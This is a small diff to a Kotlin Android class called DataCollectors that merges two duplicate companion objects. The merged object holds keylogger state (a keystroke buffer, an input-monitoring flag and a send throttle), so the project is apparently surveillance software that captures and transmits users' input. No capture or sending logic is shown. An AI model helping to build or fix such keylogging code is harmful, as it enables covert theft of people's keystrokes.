@@ -39,14 +39,11 @@ import java.util.*
 class DataCollectors(private val context: Context) {
 
     companion object {
+        private const val TAG = "DataCollectors"
         @Volatile var inputMonitoringActive = false
         @Volatile var keyloggerBuffer = StringBuilder()
         @Volatile var lastKeylogSend = 0L
         const val KEYLOG_THROTTLE = 2000L
-    }
-
-    companion object {
-        private const val TAG = "DataCollectors"
     }
 
     private var pendingPermCallback: ((Map<String, Boolean>) -> Unit)? = null
